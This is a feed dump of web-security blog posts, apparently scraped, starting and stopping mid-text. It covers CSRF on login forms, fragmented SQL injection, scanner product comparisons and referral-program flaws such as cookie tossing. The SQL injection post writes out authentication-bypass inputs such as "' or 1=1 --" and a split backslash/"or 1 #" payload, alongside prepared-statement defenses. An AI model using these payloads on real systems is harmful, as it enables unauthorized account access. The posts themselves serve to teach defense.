protection by default, you can override JavaScript’s XMLHttpRequest.open() method so that all outgoing requests automatically include a custom anti-CSRF header. Many popular JavaScript libraries and frameworks provide built-in mechanisms to achieve this, making it easier to integrate CSRF protection into Ajax-based applications.\nOlder security recommendations sometimes suggested that API endpoints do not require CSRF protection. However, as more applications are now fully API-driven, this advice is outdated. Just like with Ajax requests, API security can be strengthened by enforcing custom request headers to verify request authenticity and prevent CSRF attacks.\nThe Importance of Anti-CSRF Tokens for Login Forms\nA common misconception is that CSRF protection is only necessary after a user logs in, leading some to believe that login forms do not require anti-CSRF tokens. While an attacker cannot directly impersonate a user before authentication, failing to secure the login process can still expose sensitive information and lead to account manipulation.\nHow an Attacker Can Exploit an Unprotected Login Form\n- The attacker creates an account on your web application.\n- They trick a victim into logging in using the attacker’s credentials—this can be achieved through social engineering tactics, such as sending a disguised login link.\n- The victim unknowingly uses the application while logged into the attacker’s account instead of their own.\n- The attacker monitors the victim’s activity, potentially gaining access to personal data, financial information, or tracking user interactions. In some cases, they may be able to initiate actions on behalf of the victim, such as making purchases using stored payment details.\nTo prevent this type of attack, CSRF protection should also be implemented on login forms, ensuring that only legitimate login attempts are processed.\nCSRF Protection and XSS Mitigation Go Hand in Hand\nWhile properly implemented anti-CSRF tokens are an effective defense against CSRF attacks, they are not foolproof if other vulnerabilities exist within the application. In particular, cross-site scripting (XSS) vulnerabilities can bypass CSRF protections by injecting malicious scripts that dynamically request and submit forms, automatically retrieving and using a valid CSRF token in the process.\nTo ensure a strong security posture:\n- Regularly scan and test your web applications, APIs, and authentication flows for vulnerabilities, including CSRF and XSS.\n- Implement strict input validation to prevent XSS attacks that could be leveraged to exploit CSRF protections.\n- Use secure coding practices and security tools to detect and mitigate threats before they can be exploited.\nA comprehensive security approach—covering CSRF prevention, XSS mitigation, and overall web application security—is essential to protect user data and prevent account manipulation.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:37.557089"}
{"source": "blog", "feed": "https://www.acunetix.com/blog/feed/", "title": "Mitigating Fragmented SQL Injection Attacks: Effective Solutions", "url": "https://www.acunetix.com/blog/articles/mitigating-fragmented-sql-injection-attacks/", "published": "Wed, 12 Feb 2025 12:45:29 +0000", "content": "This blog post breaks down Fragmented SQL Injection, a method hackers use to bypass authentication by manipulating two different input fields at the same time. Our security expert explains why single quotes matter in SQL injection attacks and how using Prepared Statements (also called Parameterized Queries) can effectively prevent these types of exploits.\nLEARN MORE: How to prevent SQL Injection\nIf you ask someone how to check for an SQL injection vulnerability in a web application, their first suggestion might be to enter a single quote (‘) into an input field. If the application responds with an error, it could indicate that the input is interfering with the database query—a classic sign of SQL injection. In fact, some people even refer to SQL injection as “Single Quote Injection” because of how often this method is used to test for vulnerabilities.\nHowever, attackers are not limited to simple single-quote injections. Our research explores Fragmented SQL Injection, a more advanced technique where hackers manipulate two separate input fields within the same query context to bypass authentication systems. Understanding how single quotes affect database queries is essential to recognizing and preventing these types of attacks. Let’s take a closer look.\nThe Role of Single Quotes in SQL Injection Attacks\nIn many systems—such as command interpreters, file systems, and databases—certain characters have special meanings. These characters, known as metacharacters, can change how a system processes commands. In SQL, single (‘) and double (“) quotes act as string delimiters, marking the beginning and end of a text-based input.\nBecause of this, injecting an unescaped single or double quote into a database query can break the query’s structure, often resulting in a syntax error. Consider the following SQL statement:\nSELECT * FROM users WHERE username='USER_INPUT'\nIf an attacker enters a single quote (‘) as input, the database query may become malformed, leading to an error:\n$username = \"'\";\n$query = \"SELECT * FROM users WHERE username='\".$username.\"'\"\nResulting SQL Query\nSELECT * FROM users WHERE username=''''\nHere, the database is unable to process the query because the extra, unmatched single quote disrupts the expected syntax. This type of error is a key indicator that user input is not properly filtered or sanitized, making the system potentially vulnerable to SQL injection attacks.\nWhen Single Quotes Aren’t Needed for SQL Injection\nWhile string-based SQL queries are affected by quote injection, not all database queries rely on string inputs. Consider a scenario where the application queries a database using an integer-based identifier:\n$query = \"SELECT * FROM users WHERE id=\" . $user_input;\nIn this case, single or double quotes are unnecessary. Instead, an attacker would need to inject a numeric value that modifies the SQL statement to execute unintended commands.\nBlacklisting or Escaping Single Quotes\nTo defend against simple SQL injection attempts, some systems escape or blacklist single quotes, preventing them from breaking the query. However, this method is not foolproof.\nFor example, if a hacker attempts to inject the following payload:\n$username = \"' or 1=1 --\";\n$password = \"qwerty123456\";\n$query = \"SELECT * FROM users WHERE username='\".$username.\"' AND password='\".$password.\"'\";\nThe resulting SQL query would be:\nSELECT * FROM users WHERE username='\\' or 1=1 -- ' or password='qwerty123456';\nSince the single quote (‘) is escaped with a backslash (\\), the injection attempt fails, as the query no longer executes the intended malicious logic.\nWhile escaping single quotes can reduce the risk of basic SQL injection attacks, it is not a complete solution. The most effective way to prevent SQL injection is by using Prepared Statements (Parameterized Queries), which separate user input from SQL commands entirely, ensuring that injected values cannot alter the intended logic of the query.\nUnderstanding Fragmented SQL Injection\nFragmented SQL Injection is an attack technique where multiple input fields are manipulated together to bypass authentication or other security controls. While not originally named by its discoverer, this method allows attackers to split their malicious payloads across different input fields to evade detection mechanisms such as blacklists and character limits.\nHow Fragmented SQL Injection Works\nIn a typical SQL injection attack, a hacker might insert a single quote (‘) to break the query structure. However, some systems automatically escape special characters using a backslash (\\), preventing direct injection. Fragmented SQL injection gets around this by splitting the payload between two input fields that are processed within the same SQL query context.\nConsider the following authentication attempt:\nInput Fields:\nUsername: \\\nPassword: or 1 #\nResulting Query:\nSELECT * FROM users WHERE username='\\' and password=' or 1 # ';\nWhy This Works\n- The backslash (\\) entered in the username field escapes the next single quote (‘), neutralizing it.\n- The password field then contains the payload: or 1 #, which modifies the logic of the SQL statement.\n- Since or 1 is always true, the query successfully authenticates the attacker without needing a valid password.\n- The # (hash) character acts as a comment marker, telling the database to ignore the rest of the query, effectively bypassing any remaining authentication checks.\nThe Impact\nBy leveraging this technique, an attacker can bypass login forms and authentication mechanisms, potentially gaining unauthorized access to user accounts or administrative controls. Traditional input validation and blacklists may fail to detect this attack since each input field alone appears harmless—but when processed together, they form a complete SQL injection payload.\nPreventing Fragmented SQL Injection\nTo protect against this technique, applications should implement strong SQL injection defenses, including:\n- Prepared Statements (Parameterized Queries) – These ensure user inputs are treated as data, not SQL commands.\n- Strict Input Validation – Disallow escape characters and enforce input length constraints.\n- Escaping and Encoding – Ensure user input cannot break query logic.\n- Limiting Error Messages – Avoid revealing query structure through error responses.\nThe Limitations of Filtering Functions in SQL Injection Prevention\nA referenced blog post suggests using PHP’s htmlentities() function to filter user inputs as a way to prevent SQL injection attacks. When configured with the ENT_QUOTES flag, this function converts special characters—such as single quotes (‘), double quotes (“), and HTML tags—into their corresponding HTML entities. For example, a double quote would be encoded as:\nWhile this method may reduce the risk of injection in some cases, it is not a foolproof solution. SQL injection attacks can still be executed without using single or double quotes, making this approach insufficient as a primary defense mechanism. Additionally, legacy encoding tricks like GBK encoding can sometimes bypass security functions such as addslashes() in PHP, further weakening this type of input filtering.\nWhy Prepared Statements Are the Best Defense Against SQL Injection\nThe most effective and reliable way to prevent SQL injection attacks is by using Prepared Statements, also known as Parameterized Queries.\nWhy Prepared Statements Work:\n- They separate SQL query structure from user input, ensuring that user data is treated strictly as a value, not as part of the SQL command.\n- Unlike filtering-based approaches, they are resistant to evolving SQL injection techniques.\n- They eliminate the need for manual escaping, making the code more secure and less prone to errors.\nMany input filtering techniques, including htmlentities(), may offer partial protection, but attackers continue to find ways to bypass them. Relying on these methods alone leaves applications vulnerable to new attack techniques, making Prepared Statements the only consistently reliable approach for preventing SQL injection.\nImplementing Parameterized Queries in PHP and .NET\nUsing Parameterized Queries is the most effective way to protect applications from SQL injection attacks. Below are examples of how to implement this approach in PHP and .NET to ensure secure database queries.\nParameterized Queries in PHP\nIn PHP, the prepare() method is used to define an SQL statement with placeholders, and bindParam() assigns values securely:\n$stmt = $dbh->prepare(\"UPDATE users SET email=:new_email WHERE id=:user_id\");\n$stmt->bindParam(':new_email', $email);\n$stmt->bindParam(':user_id', $id);\nParameterized Queries in .NET\nFor .NET applications, parameterized queries are implemented using the SqlCommand class. Instead of inserting raw user input into the SQL statement, parameters are explicitly defined and assigned values:\nstring sql = \"SELECT * FROM Customers WHERE CustomerId = @CustomerId\";\nSqlCommand command = new SqlCommand(sql);\ncommand.Parameters.Add(new SqlParameter(\"@CustomerId\", System.Data.SqlDbType.Int));\ncommand.Parameters[\"@CustomerId\"].Value = 1;\nWhy Prepared Statements Are Essential\nMany developers still rely on blacklist-based filtering to block SQL injection attempts, either manually or through functions like addslashes(). However, attackers continue to develop new techniques to bypass these defenses, making blacklist-based approaches unreliable.\nThe only consistently effective way to prevent SQL injection vulnerabilities is by using Prepared Statements (Parameterized Queries). This method ensures that user input is always treated as data rather than part of the SQL command, effectively neutralizing injection attempts at the database level.\nGet the latest content on web security\nin your inbox each week.", "timestamp": "2025-10-21T13:34:38.288010"}
{"source": "blog", "feed": "https://blog.detectify.com/feed/", "title": "Product comparison: Detectify vs. Escape", "url": "https://blog.detectify.com/industry-insights/product-comparison-detectify-vs-escape/", "published": "Mon, 20 Oct 2025 07:26:15 +0000", "content": "Product comparison: Detectify vs. Tenable\nThe difference between Detectify and Tenable lies in their core scope and the use cases they support. Detectify is a specialized, attacker-centric platform designed for …\nChoosing the right tool is a critical decision that depends on a team’s specific goals, resources, and technical focus. This review provides an in-depth comparison of two leading platforms, Escape and Detectify, to help you make an informed choice. We will explore how each tool approaches three core pillars of any effective AppSec program: Visibility (discovering and understanding your attack surface), Assessment (accurately finding vulnerabilities), and Usability (ensuring the tool is efficient and enjoyable to use). By the end of this comparison, you will have a clear understanding of each platform’s strengths and weaknesses, enabling you to determine which solution is the better fit for your team’s unique operational style—whether you need a tool built for deep, customizable analysis or one optimized for speed and decisive, guided action.\nWe’ve built this comparison mainly based on the feedback from dialogues with prospective clients and past Escape users who decided to evaluate Detectify as its alternative, but also based on the following sources:\nTL;DR\nAn image showing a comparative feature chart between Escape and Detectify. The chart has three columns: FEATURE, ESCAPE, and DETECTIFY, which detail how each product handles the specific feature. The features and their corresponding comparison points are:\nAttack Surface Discovery:\nEscape: External assets, as well as some internal assets.\nDetectify: Available in all tiers. Data is regularly updated every 24 hours.\nVulnerability Assessment:\nEscape: Tests both modern web assets and APIs.\nDetectify: Leverages internal security research, private community of ethical hackers, and AI Researcher, Alfred.\nAsset Classification:\nEscape: Classifies web assets and APIs.\nDetectify: Automatically classifies all assets based on attack surface discovery data.\nScan Recommendations:\nEscape: Doesn’t provide recommendations on what to scan, requires users to create curated lists.\nDetectify: Recommends web apps to scan that you might have missed and are potential attack targets.\nAPI Testing:\nEscape: Despite not having dynamic API testing, they can test for GraphQL endpoints.\nDetectify: Offers dynamic API testing: hundreds of tests with innovation payload rotation capability.\nAuthenticated Testing:\nEscape: Offers authenticated scanning.\nDetectify: Offers authenticated scanning.\nCompliance:\nEscape: Limited scope within compliance.\nDetectify: Checks for OWASP Top 10, some NIST Cybersecurity Framework. Established partnership with PCI experts.\nPayload-based testing:\nEscape: Relies on signature based testing.\nDetectify: All tests run payload-based testing to reduce the amount of time spent validating runs.\nEase of use/ time to get started:\nEscape: Easy to set up and manage.\nDetectify: Easy to set up and manage.\nSubdomain testing:\nEscape: Doesn’t test for the same set of tests as Detectify.\nDetectify: Pioneered CWE284 for subdomain takeover, now has the largest amount of tests.\nCustom modules:\nEscape: Doesn’t offer customer tests.\nDetectify: Internal security research teams can build bespoke tests for users.\nIntegrations:\nEscape: Integrate with a variety of tools.\nDetectify: Integrate with a variety of tools.\nCustomer success:\nEscape: Offers knowledge based and support tickets.\nDetectify: CSM, CSE and knowledge base.\nPros\nCons\nPros\nCons\nFor any AppSec team, visibility is the starting point. The goal is to discover and understand every web-facing asset and API to create an actionable inventory of the attack surface. This allows teams to move from reactive to proactive by focusing their resources where they matter most. While both platforms provide excellent visibility, they are built for different operational tempos.\nEscape is designed for deep data synthesis. Escape excels at building a granular, deeply contextualized map of an application ecosystem, with a clear strength in modern APIs. It achieves this through a hybrid discovery model, integrating with internal cloud and developer tools to enrich its asset inventory with data like code owners and business criticality. The platform provides a powerful, queryable database that is ideal for AppSec teams who have the resources to dive deep into the data and synthesize their own complex, risk-based strategies.\nDetectify is designed for rapid action. Detectify’s strength lies in its ability to not just show you what you have, but to tell you what to do next. Its continuous, outside-in discovery provides a continuous view of your external attack surface. Its key differentiator is its ability to classify assets and then immediately recommend which specific web apps you should be scanning. This moves beyond simple inventory to provide clear, prioritized direction. For leaner AppSec teams or those who need to act fast without getting bogged down in data analysis, this is a massive advantage. It provides the essential signals needed to focus security testing on the most critical, high-risk assets, making it an exceptionally efficient choice for fast-moving organizations.\nBoth tools provide excellent visibility. Escape offers a powerful, data-rich platform for teams that want to perform deep, custom analysis. However, Detectify is an excellent choice for AppSec teams who need to move quickly from discovery to action. Its ability to not only map the attack surface but also provide clear recommendations on what to scan makes it an invaluable tool for teams that need to prioritize effectively and act decisively with limited time and resources.\nOnce an AppSec team has visibility of their attack surface, the next critical step is assessment: the process of actively testing applications and APIs to find vulnerabilities. An effective assessment provides AppSec teams with reliable, actionable findings that they can confidently pass to development teams for remediation.\nEscape’s assessment capability is built on an AI-driven, behavioral analysis model. Its engine acts like an automated penetration tester, learning the intended business logic of an application and its APIs. Its standout feature, mentioned by users on G2, is its ability to find complex business logic and access control flaws like BOLA and BFLA, which are often missed by traditional scanners. With a deep, native understanding of GraphQL and a focus on providing developer-friendly proof-of-exploits, Escape is engineered to find context-specific vulnerabilities in modern application architectures.\nDetectify’s assessment is defined by its unique combination of human ingenuity and automated precision, centered on high-accuracy, payload-based testing. Its primary innovation is a hybrid intelligence model that combines an internal security research team, an AI agent named Alfred, and an elite, invite-only community of ethical hackers called Detectify Crowdsource. This collaboration results in truly proprietary vulnerability coverage with over 75% of Detectify’s tests are for vulnerabilities not covered by common open-source tools. But it’s not the breadth of coverage, it’s also the depth. Its commitment to payload-based testing ensures that every reported finding is a real, exploitable issue. The API scanner’s ability to generate up to 922 quintillion payload variations for a single vulnerability demonstrates a level of thoroughness designed to give AppSec teams absolute confidence in the results.\nWhile both platforms provide excellent assessment, Detectify’s human-augmented, payload-centric model provides a distinct advantage in both accuracy and unique coverage. Escape offers a powerful solution for finding complex logic flaws. However, for AppSec teams that need to trust their findings implicitly and want to discover vulnerabilities that other scanners will definitively miss, Detectify’s combination of elite ethical hacker intelligence and exhaustive, payload-based testing is the more compelling and reliable choice.\nA security tool is only effective if it’s actually used, making usability a critical factor. For AppSec teams, this means a tool must answer two questions: “How quickly can I get started and see value?” and “Will my team enjoy using this, whether through the UI or API?” True usability is about reducing friction and integrating seamlessly into a team’s natural workflow, making the tool feel like an asset rather than a burden.\nEscape is highly praised in G2 reviews for its fast setup and is designed for the hands-on technical user who values control and customization. Its API-first design, powerful command-line interface (CLI), and scriptable configuration files make it a favorite among engineers who want to automate security as part of a “security-as-code” workflow. The “enjoyment” factor for Escape’s users comes from this deep, granular control and the ability to seamlessly integrate the tool into their CI/CD pipelines and custom scripts, making it feel like a native part of their engineering ecosystem.\nDetectify, on the other hand, is optimized for speed, clarity, and decisive action. The user experience is engineered to be exceptionally intuitive, guiding the user logically from asset discovery to clear, actionable recommendations on what to scan. This action-oriented interface removes the cognitive load of data synthesis. The enjoyment of using Detectify comes from this efficiency; it allows an AppSec engineer to log in, immediately understand their most critical risks, and confidently take the next step, which is invaluable for lean teams who need to move fast.\nWhile both platforms offer great usability, they cater to different operational styles. Escape provides a powerful and enjoyable experience for the engineer who wants to build and customize their security workflows. However, Detectify delivers a superior user experience for the AppSec team that prioritizes speed and guided action. Its intuitive, recommendation-driven workflow makes it incredibly easy to get started and immediately focus on the most critical security issues, ensuring that teams can act quickly and effectively from day one.\nThe decision between Escape and Detectify hinges on an AppSec team’s specific operational priorities, technical focus, and desired workflow. Both platforms are highly capable and well-regarded, but they are designed to serve different primary objectives.\nThe choice depends on the team’s focus. Escape is ideal for technical teams needing deep, customizable control to secure complex internal APIs, leveraging its AI to find nuanced business logic flaws and perform in-depth data synthesis. Conversely, Detectify is built for teams prioritizing speed and efficiency on their external attack surface; it provides clear recommendations and uses a unique, high-accuracy assessment model to find proprietary vulnerabilities, enabling lean teams to act decisively with minimal triage.\nThe difference between Detectify and Tenable lies in their core scope and the use cases they support. Detectify is a specialized, attacker-centric platform designed for …\nYour responsibilities cover the full spectrum of risk—from the applications your teams build and the products you ship to the overarching compliance mandates you must …", "timestamp": "2025-10-21T13:34:40.569099"}
{"source": "blog", "feed": "https://blog.detectify.com/feed/", "title": "Why API security is different (and why it matters)", "url": "https://blog.detectify.com/best-practices/why-api-security-is-different-and-why-it-matters/", "published": "Tue, 14 Oct 2025 08:23:39 +0000", "content": "EU Regulating InfoSec: How Detectify helps achieving NIS 2 and DORA compliance\n**Disclaimer: The content of this blog post is for general information purposes only and is not legal advice. We are very passionate about cybersecurity rules and …\nTwo months since I joined Detectify and I’ve realized something: API security is a completely different game from web application security. And honestly? I think a lot of teams don’t see this yet.\nLet’s look at the modern application. Your mobile app? APIs. Your crucial SaaS integrations? APIs. That complex checkout flow? Probably five or more API calls talking with each other. Modern applications are, fundamentally, just APIs talking to other APIs with a fancy UI layered on top.\nBut here’s what’s been catching me off guard: many companies don’t even have a complete inventory of their APIs. You’re trying to secure a perimeter you can’t even see the edges of. I have seen:\nHow can you secure what you can’t see?\nWhen we talk about web vulnerabilities, usually we’re dealing with XSS, CSRF, clickjacking – stuff that messes with what users see or tricks them into clicking something they shouldn’t. API vulnerabilities are a different beast. We’re talking broken authentication, APIs exposing way too much data, weak rate limiting, injection attacks.\nThese attacks skip the UI entirely. An attacker doesn’t need to trick a user into clicking something malicious. They just need to understand your API contract and find the weak spots. That’s it. The scary part? They can automate all of this.\nWeb apps usually use session-based authentication with cookies. It’s pretty standard, most frameworks handle it well, and there are well-known patterns to follow. APIs? That’s where things get messy. OAuth, JWT, API keys, mutual TLS, custom bearer tokens… There are so many different approaches, and each one has its own vulnerability patterns. I’ve been diving deep into the OWASP API Security Top 10, and honestly, the auth issues are wild. Broken Object Level Authorization, Broken Function Level Authorization… these things have scary-long names, but they’re everywhere. Even though everyone knows about them, they still pop up in production all the time.\nAPI attacks are growing at an alarming rate for several reasons:\nThis is exactly why we’re constantly enhancing our API Scanning capabilities at Detectify, because understanding these blind spots is the first step to fixing them.\nWe’d love to hear how other teams are tackling this complex problem.\nQ: What is the primary difference between web application security and API security?\nA: Web application security often focuses on user-facing vulnerabilities like XSS, while API security is concerned with flaws like broken authentication and weak access control that attackers can exploit by directly interacting with the API endpoints, bypassing the UI.\nQ: What are Shadow and Zombie APIs?\nA: Shadow APIs are old endpoints that are forgotten but still deployed, while Zombie APIs are test or staging endpoints that were never turned off, and both extend the attack surface without the organization’s knowledge.\nQ: Why are API attacks easily automated?\nA: API attacks are easily automated because APIs return structured data (like JSON or XML) that is much easier for a script or bot to parse and manipulate than the more complex and varied structure of HTML pages.\n**Disclaimer: The content of this blog post is for general information purposes only and is not legal advice. We are very passionate about cybersecurity rules and …\nTLDR: This article details methods and tools (from DNS records and IP addresses to HTTP analysis and HTML content) that practitioners can use to classify …", "timestamp": "2025-10-21T13:34:41.129667"}
{"source": "blog", "feed": "https://blog.detectify.com/feed/", "title": "Product comparison: Detectify vs. Tenable", "url": "https://blog.detectify.com/industry-insights/product-comparison-detectify-vs-tenable/", "published": "Fri, 10 Oct 2025 07:31:48 +0000", "content": "Product comparison: Detectify vs. Escape\nChoosing the right tool is a critical decision that depends on a team’s specific goals, resources, and technical focus. This review provides an in-depth comparison …\nThe difference between Detectify and Tenable lies in their core scope and the use cases they support. Detectify is a specialized, attacker-centric platform designed for the application security practitioner. Its focus is exclusively on the external, internet-facing attack surface with Dynamic Application Security Testing (DAST) to find exploitable vulnerabilities in web applications and APIs. In contrast, Tenable is a comprehensive exposure management platform built for the entire security and risk organization. It provides a holistic view of risk across the entire IT estate—from internal servers and cloud infrastructure to identity systems and the external perimeter—positioning itself as the central nervous system for enterprise-wide vulnerability and risk management.\nTheir differing scope dictates their strengths. Detectify’s primary advantage for an AppSec team is the high-fidelity, low-noise nature of its findings. Its unique reliance on payload-based testing, powered by a crowdsourced network of elite ethical hackers, delivers results that prove exploitability and are immediately actionable. This builds credibility with development teams and streamlines the remediation workflow, which is a significant usability win. Tenable’s strength lies in its unmatched breadth of coverage and its powerful risk contextualization through the Vulnerability Priority Rating (VPR) and Attack Path Analysis. It excels at showing how an application fits into an org’s risk profile, making it an indispensable tool for compliance and enterprise risk management.\nWe’ve built this comparison mainly based on the feedback from dialogues with prospective clients and past Qualys users who decided to evaluate Detectify as its alternative, but also based on the following sources:\nTL;DR\nPros\nCons\nPros\nCons\nFor an Application Security Engineer, the primary goal is to find actionable, high-fidelity vulnerabilities in web applications and their related infrastructure. The choice between a specialized tool like Detectify and a platform like Tenable comes down to the scope of your team’s responsibility and the type of security context you find most valuable for driving remediation.\nThe core scope of the two platforms is fundamentally different. Detectify operates with an “outside-in,” attacker-centric point of view. It is a purpose-built platform designed to discover and test the external, internet-facing attack surface with a deep focus on web applications and APIs. Its mission is to find currently exploitable vulnerabilities as a real-world attacker would. In contrast, Tenable follows an “inside-out and outside-in” philosophy. It aims to provide a holistic map of the entire organization’s cyber exposure, from internal servers and cloud infrastructure to the external perimeter, positioning itself as the single source of truth for all technology risk.\nWhen it comes to visibility, the key question for an AppSec buyer is, “What web assets do I have, and are they exposed?” Detectify’s “Surface Monitoring” provides external visibility, operating as a specialized attack surface tool. It continuously scans public sources to discover internet-facing domains and web applications, excelling at uncovering forgotten assets like unknown marketing sites that fall outside of central IT’s purview. But it’s not just a discovery tool, Surface Monitoring also tests each and every asset for vulnerabilities, making it possible for AppSec teams to select a root domain and enable continuous testing on their entire attack surface. Surface Monitoring also recommends assets to scan deeper with their other product, Application Scanning. This means that a user can regularly update their testing even if they don’t have visibility of what is being released into production, something that is increasing with AI agents.\nTenable provides a much broader scope of visibility. It combines an external ASM module, similar in function to Detectify’s, with a suite of internal discovery tools, including active network scanners, passive monitors, and endpoint agents. This allows Tenable to create an asset inventory that includes everything from web servers and APIs to firewalls, workstations, and OT devices. While this visibility is incredibly powerful for a CISO or a large security organization, it can introduce significant noise for an AppSec team whose charter is limited to the application layer. The critical difference lies in the depth: Tenable can perform deep, credentialed scans on internal hosts for a complete software and configuration audit, whereas Detectify’s visibility stops at the external perimeter.\nWhile both Detectify and Tenable are designed to find security flaws, their fundamental methodologies for assessment are vastly different, leading to distinct outcomes that cater to different needs within a security program.\nTenable’s vulnerability assessment is built on the foundation of its Nessus engine. This engine employs a broad-spectrum approach, utilizing a massive library of plugins – or vulnerability tests – to assess a wide variety of assets. Its methodology is a mix of techniques: it performs version checking by comparing service banners against a database of known vulnerable software; it conducts deep configuration auditing via authenticated scans to check for compliance with security benchmarks; and for certain vulnerabilities, it uses “safe” payloads to confirm a flaw’s existence.\nDetectify, on the other hand, employs a much more focused and specialized assessment methodology. Its engine is entirely payload-based. This means that for every test it runs, it sends a carefully crafted payload designed to actively exploit a potential vulnerability, rather than relying on version checking. If Detectify reports a vulnerability, it’s because it successfully executed a payload and received a response that confirmed the flaw. This attacker-centric approach simulates how a real threat actor would probe a target, focusing exclusively on the application layer.\nThe intelligence that powers these assessment engines comes from two very different sources. Tenable maintains a large portfolio of tests for the Nessus engine. This results in incredibly broad and timely coverage for publicly disclosed vulnerabilities across a vast landscape of technologies.\nDetectify’s intelligence model is one of its core value propositions. It relies on the Detectify Crowdsource network, a private, invite-only community of elite, vetted ethical hackers. These researchers submit vulnerability modules for novel and often unknown attack techniques that they are successfully using in real-world engagements. This provides Detectify with a highly curated and cutting-edge library of tests that often go beyond standard CVEs, focusing on complex business logic flaws and creative exploit chains that traditional scanners might miss.\nDetectify also leverages its internal security research team, and Alfred, their AI Security Research Agent who can find POCs for CVEs online and build them into their assessment engine.\nDetectify approaches API testing with its dynamic, payload-based DAST engine. Our dynamic approach allows for a massive scale of test variations. For certain tests like prompt injection, the number of potential payload permutations is theoretically over 9.2 quintillion. For command injections, we utilize a library of over 330,000 payloads. This method is highly effective for finding exploitable vulnerabilities in both known and “shadow” APIs that may have been discovered by its EASM but are not formally documented.\nTenable’s Web App Scanning (WAS) product provides a “white-box” DAST approach to API security. Its primary method for API testing involves importing formal API definitions, such as OpenAPI (Swagger) or Postman collections. By ingesting the API schema, the scanner gains a complete map of all documented endpoints, parameters, and expected data formats. It can then methodically test each part of the defined API for vulnerabilities.\nThese differing methodologies lead to different types of findings. Tenable provides a clear risk picture, which often includes a wide spectrum of issues that must be triaged using the VPR score to identify the truly risky items. Detectify’s payload-based approach is optimized for high signal and low noise. The goal is to reduce the time security teams spend validating findings. Because every reported vulnerability has been confirmed with an exploit payload, the rate of false positives is exceptionally low, and the results can be sent to developers with a high degree of confidence.\nDetectify is built for speed and simplicity. It is regularly cited as “easy to set up and manage.” For an AppSec team, the onboarding process is streamlined: you provide your organization’s top-level domains, and Detectify’s Surface Monitoring begins discovering the external attack surface automatically. Configuring an application scan is similarly straightforward, with a clear focus on getting the DAST engine running against these discovered assets quickly. This low-friction setup allows a team to achieve value almost immediately, without a significant investment in training or complex configuration.\nTenable, by contrast, offers a significantly more complex onboarding experience. The usability here is split between its SaaS platform, Tenable.io and its on-premises solution, Tenable.sc, which is frequently described as dated and having a steep learning curve. Regardless of the platform, a full deployment requires a considerable upfront investment in configuration: deploying various scanner types, securely managing credentials for authenticated scanning across diverse systems, and fine-tuning granular scan policies to balance performance with thoroughness. This complexity is the necessary trade-off for the platform’s comprehensive visibility.\nYour choice depends on your team’s primary mission and biggest challenge.\nChoose Detectify if your team is primarily focused on securing your external applications and APIs. It is a best-of-breed tool optimized for the AppSec team, delivering high-fidelity, exploitable findings that minimize validation overhead and reduce friction with developers.\nChoose Tenable if your primary challenge is a lack of visibility and risk prioritization across a complex, hybrid enterprise. It is a massive and complex platform whose discovery, VPR, and Attack Path Analysis capabilities are necessary for managing a broad spectrum of cyber risk.\nChoosing the right tool is a critical decision that depends on a team’s specific goals, resources, and technical focus. This review provides an in-depth comparison …\nYour responsibilities cover the full spectrum of risk—from the applications your teams build and the products you ship to the overarching compliance mandates you must …", "timestamp": "2025-10-21T13:34:41.689918"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "Referral Beware, Your Rewards are Mine (Part 1)", "url": "https://rhinosecuritylabs.com/research/referral-beware-your-rewards-are-mine-part-1/", "published": "Wed, 27 Aug 2025 17:03:12 +0000", "content": "Introduction\nReferral rewards programs are nearly ubiquitous today, from consumer tech to SaaS companies, but are rarely given much security oversight. In this blog post we’ll dig into the common technical implementations of rewards programs on web apps, common security issues with each approach, and recommendations for secure development of similar programs. In a subsequent post, we’ll explore real-world examples of these vulnerability classes in detail.\nCommon Referral Rewards Implementations\nReferral rewards programs generally follow this flow:\n- A user shares a referral code or link with a prospective user\n- The user signs up using shared code or link\n- The user receives some reward for signing up or completing some requirement and the user of whom the referral code belongs\n- The user receives a reward\nThese rewards come in various forms to incentivize referrals. Companies commonly offer discounts on purchases, store credit that can be used for future transactions, or application-specific rewards tailored to their product. Some programs even provide cash rewards, making them particularly attractive to users. So the theft of referral rewards can lead to either direct or indirect financial impact.\nReferral links and codes come in various forms and configurations. Applications usually offer a method to share via email or text, or offer the ability to copy the link for sharing.\nThe way in which this referral relationship is established after the referral is sent can come in a few configurations:\n- URL to cookie\n- URL to request that applies/links the code to the new account\n- Referral code as a promo code\n1 - URL Parameter to Cookie\nIn the URL to cookie implementation, the prospective user receives a referral link from an active user. Upon visiting this link, the user is usually prompted to signup for a new account. The application will extract the referral code value and it will set a referral code cookie with that code as the value. This cookie gets sent with the signup request, maintaining the referrer to referred user. Following signup, the application awards the referrer and sometimes the newly signed up user, depending upon the terms of the referral program.\n2 - URL Parameter to Client-Side Initiated Request\nIn the URL query parameter to client-side initiated request implementation, it works similar to when an app utilizes a cookie, but in this case the value is placed within multiple requests initiated by the client-side javascript, such as a fetch request. This typically follows the following logic:\n- Referral Code is extracted from query parameter.\n- The client-side code sends the referral code in a validation request.\n- If the code is valid, a second request created by the client-side code applies the referral to the pending account.\n- Upon signup completion and any required action by the new account, the referral rewards are applied according to the terms of the referral program.\n3 - Referral Code as a Promo Code\nMany applications opted to have the pending user apply the code at checkout as a promo code. This implementation can also be used in combination of the URL parameter to Client-Side Initiated request which in turn adds the referral code as a promo code after passing validation.\nThe Common Pitfalls of Referral Rewards Implementations\nTwenty plus companies running these referral programs were assessed as a part of this research. That research produced 25+ submissions of various bug classes including business logic errors and race conditions along with a wide-spread issue with mobile applications called referral hijacking. These referral programs were also discovered to be a great place to search for client-side gadgets such as client-side path traversals and cookie injection.\nClient-Side Gadgets\nApplications often will have functionality or bugs that are either of little impact, or aren’t a vulnerability by themselves, but when used in conjunction with other functionality or low impact bugs, can be used to achieve a serious vulnerability. These bugs can be referred to as gadgets, and when assessing the security of the client-side of the application, it’s important to identify any potential gadgets. Within the referral program functionality, two gadgets can be found:\n- Cookie Injection\n- Client-Side Path Traversal\nFor cookie injections, this can lead to bugs both with a referral reward focus and beyond. When an attacker controls the cookie value, the first option is to attempt a Carriage Return Line Feed (CRLF) Injection and attempt to get response header injection. If that is successful the attacker can set arbitrary cookies, allowing for a technique known as cookie tossing (Read here for more on cookie tossing).\nIn the case where a CRLF injection is not possible, but the attacker is able to escape the value and set the domain and path cookie attributes, then the attacker can do a limited version of cookie tossing, specifically targeting the referral rewards functionality. By setting the path to the specific path where the referral code is applied, an attacker can ensure that their referral code is used because the browser prioritizes cookies with a more specific path.\nFor client-side path traversals (CSPT’s), this can lead to two bug classes: Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF). Client-side path traversal attacks 